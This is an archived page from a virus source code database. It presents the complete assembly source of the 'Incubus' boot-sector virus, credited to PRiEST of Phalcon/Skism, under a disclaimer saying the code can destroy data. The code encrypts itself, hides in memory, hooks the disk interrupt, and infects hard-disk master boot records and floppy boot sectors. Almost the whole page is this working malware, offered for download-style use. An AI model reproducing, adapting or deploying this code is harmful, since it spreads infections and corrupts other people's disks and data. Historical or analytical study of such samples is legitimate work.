<html>
<head><meta http-equiv=Content-Type content='text/html; charset=UTF-8'>

<title>Virus Source Code Database :: incubus1_asm</title>
<meta name="KEYWORDS" content="incubus1.asm, virus source, source code, assembly language, assembly programming, hacking, cracking, michaelangelo, stoned, pong, cascade, ambulance, f-prot, mcafee, panda, solomon, anti-virus, anti virus, computer virus">
<meta name="DESCRIPTION" content="Virus Source Code Database - source for incubus1.asm">
</head><body><table border=0 cellpadding=0 cellspacing=0 width="100%">
<tr><td valign=top width="25%">
<a href="ice_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/i/ice_asm.php">ice_asm</a><br>
<a href="iceburn_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/i/iceburn_asm.php">iceburn_asm</a><br>
<a href="icecream_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/i/icecream_asm.php">icecream_asm</a><br>
<a href="icelandi_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/i/icelandi_asm.php">icelandi_asm</a><br>
<a href="icel_mix_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/i/icel_mix_asm.php">icel_mix_asm</a><br>
<a href="icemelt_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/i/icemelt_asm.php">icemelt_asm</a><br>
<a href="icemix1_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/i/icemix1_asm.php">icemix1_asm</a><br>
<a href="igor_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/i/igor_asm.php">igor_asm</a><br>
<a href="ikv_528_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/i/ikv_528_asm.php">ikv_528_asm</a><br>
<a href="ikv528x_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/i/ikv528x_asm.php">ikv528x_asm</a><br>
<a href="imm-265_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/i/imm-265_asm.php">imm-265_asm</a><br>
<a href="imm-353_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/i/imm-353_asm.php">imm-353_asm</a><br>
<a href="imm-377_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/i/imm-377_asm.php">imm-377_asm</a><br>
<a href="imm-510_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/i/imm-510_asm.php">imm-510_asm</a><br>
<a href="imm-550_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/i/imm-550_asm.php">imm-550_asm</a><br>
<a href="immor265_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/i/immor265_asm.php">immor265_asm</a><br>
<a href="immor353_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/i/immor353_asm.php">immor353_asm</a><br>
<a href="immor377_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/i/immor377_asm.php">immor377_asm</a><br>
<a href="immor510_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/i/immor510_asm.php">immor510_asm</a><br>
<a href="immor550_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/i/immor550_asm.php">immor550_asm</a><br>
<a href="incdaddy_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/i/incdaddy_asm.php">incdaddy_asm</a><br>
<a href="incmummy_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/i/incmummy_asm.php">incmummy_asm</a><br>
<a href="incsistr_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/i/incsistr_asm.php">incsistr_asm</a><br>
<a href="incubus1_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/i/incubus1_asm.php">incubus1_asm</a><br>
<a href="incubus_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/i/incubus_asm.php">incubus_asm</a><br>
<a href="indit_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/i/indit_asm.php">indit_asm</a><br>
<a href="infecta_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/i/infecta_asm.php">infecta_asm</a><br>
<a href="infect_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/i/infect_asm.php">infect_asm</a><br>
<a href="infectb_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/i/infectb_asm.php">infectb_asm</a><br>
<a href="inferdem_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/i/inferdem_asm.php">inferdem_asm</a><br>
<a href="insert_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/i/insert_asm.php">insert_asm</a><br>
<a href="ins_real_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/i/ins_real_asm.php">ins_real_asm</a><br>
<a href="ins-real_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/i/ins-real_asm.php">ins-real_asm</a><br>
<a href="insuff_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/i/insuff_asm.php">insuff_asm</a><br>
<a href="int_13_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/i/int_13_asm.php">int_13_asm</a><br>
<a href="int-13_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/i/int-13_asm.php">int-13_asm</a><br>
<a href="int13__asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/i/int13__asm.php">int13__asm</a><br>
<a href="int13_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/i/int13_asm.php">int13_asm</a><br>
<a href="intr1440_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/i/intr1440_asm.php">intr1440_asm</a><br>
<a href="intr1988_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/i/intr1988_asm.php">intr1988_asm</a><br>
<a href="intrude__asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/i/intrude__asm.php">intrude__asm</a><br>
<a href="intruder_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/i/intruder_asm.php">intruder_asm</a><br>
<a href="inv_danu_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/i/inv_danu_asm.php">inv_danu_asm</a><br>
<a href="invdanub_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/i/invdanub_asm.php">invdanub_asm</a><br>
<a href="inv_evil_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/i/inv_evil_asm.php">inv_evil_asm</a><br>
<a href="inv-evil_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/i/inv-evil_asm.php">inv-evil_asm</a><br>
<a href="invol_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/i/invol_asm.php">invol_asm</a><br>
<a href="iod_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/i/iod_asm.php">iod_asm</a><br>
<a href="ir144_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/i/ir144_asm.php">ir144_asm</a><br>
<a href="irm_kill_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/i/irm_kill_asm.php">irm_kill_asm</a><br>
<a href="israel_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/i/israel_asm.php">israel_asm</a><br>
<a href="it_457_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/i/it_457_asm.php">it_457_asm</a><br>
<a href="it-457_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/i/it-457_asm.php">it-457_asm</a><br>
<a href="ital_boy_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/i/ital_boy_asm.php">ital_boy_asm</a><br>
<a href="italian_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/i/italian_asm.php">italian_asm</a><br>
<a href="italiano_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/i/italiano_asm.php">italiano_asm</a><br>
<a href="it_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/i/it_asm.php">it_asm</a><br>
<a href="it_pest_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/i/it_pest_asm.php">it_pest_asm</a><br>
<a href="itti_a_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/i/itti_a_asm.php">itti_a_asm</a><br>
<a href="itti-a___asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/i/itti-a___asm.php">itti-a___asm</a><br>
<a href="itti-a__asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/i/itti-a__asm.php">itti-a__asm</a><br>
<a href="itti-a_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/i/itti-a_asm.php">itti-a_asm</a><br>
<a href="itti_b_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/i/itti_b_asm.php">itti_b_asm</a><br>
<a href="itti-b___asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/i/itti-b___asm.php">itti-b___asm</a><br>
<a href="itti-b__asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/i/itti-b__asm.php">itti-b__asm</a><br>
<a href="itti-b_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/i/itti-b_asm.php">itti-b_asm</a><br>
<a href="itty_a_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/i/itty_a_asm.php">itty_a_asm</a><br>
<a href="itty-a_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/i/itty-a_asm.php">itty-a_asm</a><br>
<a href="itty_b_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/i/itty_b_asm.php">itty_b_asm</a><br>
<a href="itty-b_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/i/itty-b_asm.php">itty-b_asm</a><br>
<a href="itwisted_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/i/itwisted_asm.php">itwisted_asm</a><br>
<a href="itwistu_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/i/itwistu_asm.php">itwistu_asm</a><br>
<a href="ivpbecky_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/i/ivpbecky_asm.php">ivpbecky_asm</a><br>
<a href="ivpbubb2_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/i/ivpbubb2_asm.php">ivpbubb2_asm</a><br>
<a href="ivpbubbl_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/i/ivpbubbl_asm.php">ivpbubbl_asm</a><br>
<a href="ivp-dan_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/i/ivp-dan_asm.php">ivp-dan_asm</a><br>
<a href="ivp-darl_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/i/ivp-darl_asm.php">ivp-darl_asm</a><br>
<a href="ivp-dj_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/i/ivp-dj_asm.php">ivp-dj_asm</a><br>
<a href="ivpmorbd_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/i/ivpmorbd_asm.php">ivpmorbd_asm</a><br>
<a href="ivpputer_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/i/ivpputer_asm.php">ivpputer_asm</a><br>
<a href="ivp-rose_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/i/ivp-rose_asm.php">ivp-rose_asm</a><br>
<a href="ivpshock_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/i/ivpshock_asm.php">ivpshock_asm</a><br>
</td>
<td valign=top><center><h2>Virus Source Code Database</h2>
<script type="text/javascript">
<!--
                  google_ad_client = "pub-4280558320877613";
                  google_ad_width = 468;
                  google_ad_height = 60;
                  google_ad_format = "468x60_as";
                  google_ad_channel = "5524853059";
                  google_ad_type = "text";
                  google_color_border = "A2CCEE";
                  google_color_bg = "EFEFEF";
                  google_color_link = "000000";
                  google_color_url = "006600";
                  google_color_text = "000000";
        //--></script>
<script type="text/javascript" src="show_ads.js" tppabs="http://pagead2.googlesyndication.com/pagead/show_ads.js"></script>
<p>
<i>This source code is provided for computer programming history.  This source code can be used for good or evil.  It can 
destroy computer data.  Be aware that I am making no claims to authorship or usability of the information found in the 
Virus Source Code Database.  I accept no responsibility for data corruption due to the use of the following information.  The 
information contained on this website is for <b>Information Purposes Only</b>!!!</i><p>
<p>
[ <a href="index.php.htm" tppabs="http://www.totallygeek.com/vscdb/1/index.php">1</a> ]&nbsp;
[ <a href="index-1.php.htm" tppabs="http://www.totallygeek.com/vscdb/a/index.php">a</a> ]&nbsp;
[ <a href="index-2.php.htm" tppabs="http://www.totallygeek.com/vscdb/b/index.php">b</a> ]&nbsp;
[ <a href="index-3.php.htm" tppabs="http://www.totallygeek.com/vscdb/c/index.php">c</a> ]&nbsp;
[ <a href="index-4.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/index.php">d</a> ]&nbsp;
[ <a href="index-5.php.htm" tppabs="http://www.totallygeek.com/vscdb/e/index.php">e</a> ]&nbsp;
[ <a href="index-6.php.htm" tppabs="http://www.totallygeek.com/vscdb/f/index.php">f</a> ]&nbsp;
[ <a href="index-7.php.htm" tppabs="http://www.totallygeek.com/vscdb/g/index.php">g</a> ]&nbsp;
[ <a href="index-8.php.htm" tppabs="http://www.totallygeek.com/vscdb/h/index.php">h</a> ]&nbsp;
[ <a href="index-9.php.htm" tppabs="http://www.totallygeek.com/vscdb/i/index.php">i</a> ]&nbsp;
[ <a href="index-10.php.htm" tppabs="http://www.totallygeek.com/vscdb/j/index.php">j</a> ]&nbsp;
[ <a href="index-11.php.htm" tppabs="http://www.totallygeek.com/vscdb/k/index.php">k</a> ]&nbsp;
[ <a href="index-12.php.htm" tppabs="http://www.totallygeek.com/vscdb/l/index.php">l</a> ]&nbsp;
[ <a href="index-13.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/index.php">m</a> ]&nbsp;
[ <a href="index-14.php.htm" tppabs="http://www.totallygeek.com/vscdb/n/index.php">n</a> ]&nbsp;
[ <a href="index-15.php.htm" tppabs="http://www.totallygeek.com/vscdb/o/index.php">o</a> ]&nbsp;
[ <a href="index-16.php.htm" tppabs="http://www.totallygeek.com/vscdb/p/index.php">p</a> ]&nbsp;
[ <a href="index-17.php.htm" tppabs="http://www.totallygeek.com/vscdb/q/index.php">q</a> ]&nbsp;
[ <a href="index-18.php.htm" tppabs="http://www.totallygeek.com/vscdb/r/index.php">r</a> ]&nbsp;
[ <a href="index-19.php.htm" tppabs="http://www.totallygeek.com/vscdb/s/index.php">s</a> ]&nbsp;
[ <a href="index-20.php.htm" tppabs="http://www.totallygeek.com/vscdb/t/index.php">t</a> ]&nbsp;
[ <a href="index-21.php.htm" tppabs="http://www.totallygeek.com/vscdb/u/index.php">u</a> ]&nbsp;
[ <a href="javascript:if(confirm('http://www.totallygeek.com/vscdb/v/index.php  \n\nThis file was not retrieved by Teleport Pro, because it was unavailable, or its retrieval was aborted, or the project was stopped too soon.  \n\nDo you want to open it from the server?'))window.location='http://www.totallygeek.com/vscdb/v/index.php'" tppabs="http://www.totallygeek.com/vscdb/v/index.php">v</a> ]&nbsp;
[ <a href="index-23.php.htm" tppabs="http://www.totallygeek.com/vscdb/w/index.php">w</a> ]&nbsp;
[ <a href="index-24.php.htm" tppabs="http://www.totallygeek.com/vscdb/x/index.php">x</a> ]&nbsp;
[ <a href="index-25.php.htm" tppabs="http://www.totallygeek.com/vscdb/y/index.php">y</a> ]&nbsp;
[ <a href="index-26.php.htm" tppabs="http://www.totallygeek.com/vscdb/z/index.php">z</a> ]&nbsp;
</center><p><textarea cols=90 rows=30>

CSEG SEGMENT
     ASSUME CS:CSEG, ES:CSEG, SS:CSEG
     ORG 0H


Incubus_Size    equ     offset Incubus_End-offset Incubus_Start

Vector_40       equ     40h*4h          ;offset in IVT of int 40h

Compare_Code_Size equ   offset Load_Comp-offset Load_Code

Boot_Code_Size  equ     offset Boot_Code_End-offset Boot_Code_Start

Crypt_Size      equ     (offset Crypt_End-offset Crypt_Start)/2

Incubus_Start:  push es
                pop ds                  ;ES = DS = 0
                call Crypt_Code         ;decrypt virus
Crypt_Start:    mov si,offset Boot_Code+7e00h ;original boot sector code                
                mov di,7c00h            ;original boot sector is here
                push es
                push di                 ;ES:DI=0:7c00h, jump there when done
                cld
                movsw                   ;restore first two bytes
                add di,3eh-2h           ;DI = 7c3eh                
                mov cx,Boot_Code_Size   ;size of saved boot code
                rep movsb
                mov ax,ds:[46ch]        ;get random word
                mov word ptr ds:[Garble_Key+7e00h],ax
                dec word ptr ds:[413h]  ;subtract 1k from memory
                int 12h                 ;get memory
                mov cl,0ah              ;rotation mask
                ror ax,cl               ;convert memory k's to segment
                mov es,ax               ;into ES
                mov si,7e00h            ;offset of Incubus_Start at boot-up
                xor di,di               ;copy to offset zero
                mov cx,Incubus_Size
                rep movsb               ;copy Incubus 7 to high memory
                mov si,Vector_40
                
;The carry flag was cleared when XOR DI,DI was executed.                

                mov ax,offset New_40    ;store offset first
Hook_Loop:      xchg ax,ds:[si]         ;exchange our pointer with original
                                        ;pointer
                stosw                   ;save in our high copy
                inc si                  ;increment pointer
                inc si
                mov ax,es               ;next do the segments
                cmc                     ;Loop once
                jb Hook_Loop
                push es                 ;jump to high segment
                mov ax,offset High_Start ;where to jump in high memory
                push ax
                retf                    ;jump

High_Start:     push cs
                pop ds                  ;DS = ES = CS = High virus segment
                mov ax,201h             ;Read one sector
                mov bx,offset Sector    ;read it to Sector
                mov cx,1h               ;track 0 sector 1
                mov dx,0080h            ;head 0, drive c:
                int 13h
                jb Hard_Infect_No
                mov cx,ds:[Sector.pt_End_Sector_Track] ;get last track/sector
                and cx,0000000000111111b     ;Last sector, track 0
                call Compare            ;check for infections, if no, infect
                jb Hard_infect_No       ;if carry, then already infected
                xor bx,bx               ;offset Incubus_Start
                mov ax,301h             ;write one sector
                push ax                 ;Push 301h, it saves a byte.
                call Crypt_13           ;encrypt virus, and call Int 13
                pop ax                  ;AX = 301h
                jb Hard_Infect_No
                mov bx,offset Sector    ;write sector
                xor cx,cx
                inc cx                  ;track 0, sector 1  MBR
                int 13h                 ;write it back to disk
Hard_Infect_No: retf                    ;JMP 0000:7c00h

Boot_Code       dw ?                    ;first two bytes
Boot_Code_Start:cli
                xor ax,ax
                mov ss,ax
                mov sp,7c00h
                push ss
                pop es
                mov ax,201h
                mov bx,7e00h
                mov cx,0000h
                mov dx,0000h
                int 13h
                jmp bx
Boot_Code_End:

Load_Code:      cli
                xor ax,ax
                mov ss,ax
                mov sp,7c00h
                push ss
                pop es
                mov ax,201h
                mov bx,7e00h
                db 0b9h                 ;mov cx,
Load_Comp:                              ;stop comparing here
Load_CX         dw ?
                db 0bah                 ;mov dx,
Load_DX         dw ?
                int 13h
                jmp bx


Incubus_Name:   db 'Incubus '
Incubus_Author: db 'PRiEST - Phalcon/Skism' 
                           
Crypt_End:


Crypt_Code:     pushf
                push ax
                push bx
                push cx                 ;save registers
                call $+3                ;push IP
                pop si
                sub si,offset $-1       ;DI = offset Incubus_Start
                lea di,ds:[si+Crypt_Start]
                mov cx,Crypt_Size       ;size of code to crypt
                call Get_CRC            ;encrypt virus by virus's CRC
Crypt_Loop:     xor word ptr ds:[di],ax ;crypt virus code
                inc di
                inc di                  ;increment pointer
                rol ax,cl               ;rotate key
                loop Crypt_Loop
                pop cx
                pop bx
                pop ax
                popf
                retn

Garble_Key      dw ?                    ;A random word here will cause the
                                        ;encryption key to change

Get_CRC:        push cx
                push di
                push si
                add si,offset Crypt_Code
                mov cx,(offset Incubus_End-offset Crypt_Code)/2
                xor bx,bx               ;initiate CRC to zero
Get_CRC_Loop:   cld
                lodsw                   ;get word from virus
                xor bx,ax               ;encrypt checksum by word
                rol bx,cl               ;encrypt checksum
                loop Get_CRC_Loop
                xchg ax,bx              ;CRC into AX
                pop si
                pop di
                pop cx
                retn


New_40:         cmp ax,201h             ;Read a sector?
                jne Jump_40
                cmp cx,1h               ;first sector, first track?
                jne Jump_40
                cmp dh,00h              ;First head?
                je Infect
Jump_40:        jmp cs:Old_40

Call_40:        pushf                   ;simulate an interrupt
                call cs:Old_40
                retn

Infect:         call Call_40
                pushf
                push ax
                push bx
                push cx
                push dx
                push di
                push si
                push ds
                push es                 ;push all registers
                jb Infect_Error
                push es
                pop ds                  ;DS = segment of boot sector
                push cs
                pop es                  ;copy boot sector to our segment
                mov si,bx               ;boot sector was at ES:BX
                mov di,offset Sector    ;copy to Sector
                mov cx,100h             ;move 256 words
                cld
                rep movsw               ;copy boot sector to Sector
                push cs
                pop ds                  ;DS = CS
                call Calculate          ;Find last sector on drive
                jb Infect_Error
                call Compare            ;infected?
                jb Infect_Error
                mov ax,301h             ;write to disk
                xor bx,bx               ;at offset Incubus_Start
                push ax                 ;save write function
                call Crypt_Code         ;encrypt virus
                call Call_40
                call Crypt_Code         ;decrypt virus
                pop ax
                jb Infect_Error
                mov bx,offset Sector
                xor cx,cx
                inc cx                  ;track zero, sector 1
                mov dh,ch               ;head zero, same drive
                call Call_40
Infect_Error:   pop es
                pop ds
                pop si
                pop di
                pop dx
                pop cx
                pop bx
                pop ax
                popf                    ;Pop all returns from int 40, and
                retf 0002h              ;return to caller


Calculate:      mov di,dx               ;save drive in DI
                mov ax,ds:[Sector.bs_Sectors] ;Get total amount of sectors
                or ax,ax                ;can not do if zero
                je Calculate_Error
                mov cx,ds:[Sector.bs_Sectors_Per_Track] ;Get sectors per track
                jcxz Calculate_Error    ;can not do if zero
                cwd                     ;zero out DX
                div cx                  ;AX = number of tracks
                or dx,dx                ;must have been an even divide
                jne Calculate_Error      
                mov bx,ds:[Sector.bs_Heads] ;get number of heads
                or bx,bx
                je Calculate_Error
                div bx                  ;divide by number of heads
                or dx,dx                ;must have been an even divide
                jne Calculate_Error      
                mov dx,di               ;drive back into DL
                mov dh,bl               ;Head number into DH
                dec dh                  ;zero based now
                mov ch,al               ;Track number into CH
                dec ch                  ;zero based also
                clc
                retn
Calculate_Error:stc                     ;return error
                retn

;This will check the boot sector for infection, if not infected, it will
;add the Load_Code to the boot sector, while saving the original contents
;into Boot_Code.

Compare:        push cx                 ;save register
                push dx
                and dl,80h              ;either C: or A:
                mov word ptr ds:[Load_CX],cx ;put sector/track into loader
                mov word ptr ds:[Load_DX],dx ;head 0, drive c:
                pop dx
                mov di,offset Sector+3eh ;offset of where our code would be
                mov si,offset Load_Code ;offset of code to compare
                mov cx,Compare_Code_Size
                cld
                repe cmpsb              ;compare code
                je Already_Inf
                cmp word ptr ds:[Sector_ID],0aa55h  ;Is it a valid sector?
                jne Already_Inf
                mov si,offset Sector    ;offset of boot sector
                mov di,offset Boot_Code ;save it here
                mov ax,3cebh            ;jmp $+3ch
                xchg ax,ds:[si]         ;exchange with Boot sector's first
                                        ;two bytes
                stosw                   ;save at Boot_Code
                add si,3eh              ;SI = offset Sector+3eh
                mov cx,Boot_Code_Size   ;size of loader code
                
                push cx                 ;save size count
                push si                 ;save pointer to boot sector
                rep movsb               ;save code into our code
                mov si,di               ;move offset of Load_Boot into si
                pop di                  ;restore pointer to boot sector
                pop cx                  ;restore size count
                rep movsb               ;mov our loader into boot sector
                pop cx                  ;restore saved register
                clc                     ;return no error
                retn

Already_Inf:    pop cx                  ;restore saved register
                stc                     ;return error
                retn

Crypt_13:       call Crypt_Code         ;encrypt virus
                int 13h
                call Crypt_Code         ;decrypt virus
                retn

Incubus_End:   
        
Old_40          dd ?            ;original Int 40h   


Sector          db 510 dup (?)
Sector_ID       dw ?                    ;Should equal 0aa55h for valid boot
                                        ;sector

                



Boot_Sector             STRUC
bs_Jump                 db 3 dup(?)
bs_Oem_Name             db 8 dup(?)
bs_Bytes_Per_Sector     dw ?
bs_Sectors_Per_Cluster  db ?
bs_Reserved_Sectors     dw ?
bs_FATs                 db ?             ;Number of FATs
bs_Root_Dir_Entries     dw ?             ;Max number of root dir entries
bs_Sectors              dw ?             ;number of sectors; small
bs_Media                db ?             ;Media descriptor byte
bs_Sectors_Per_FAT      dw ?
bs_Sectors_Per_Track    dw ?
bs_Heads                dw ?             ;number of heads
bs_Hidden_Sectors       dd ?
bs_Huge_Sectors         dd ?             ;number of sectors; large
bs_Drive_Number         db ?
bs_Reserved             db ?
bs_Boot_Signature       db ?
bs_Volume_ID            dd ?
bs_Volume_Label         db 11 dup(?)
bs_File_System_Type     db 8 dup(?)
Boot_Sector             ENDS


Partition_Table         STRUC
pt_Code                 db 1beh dup(?)  ;partition table code
pt_Status               db ?            ;0=non-bootable 80h=bootable
pt_Start_Head           db ?            
pt_Start_Sector_Track   dw ?
pt_Type                 db ?            ;1 = DOS 12bit FAT 4 = DOS 16bit FAT
pt_End_Head             db ?
pt_End_Sector_Track     dw ?
pt_Starting_Abs_Sector  dd ?
pt_Number_Sectors       dd ?
Partition_Table         ENDS

CSEG ENDS
     END Incubus_Start

</textarea></td></tr></table></body></html>
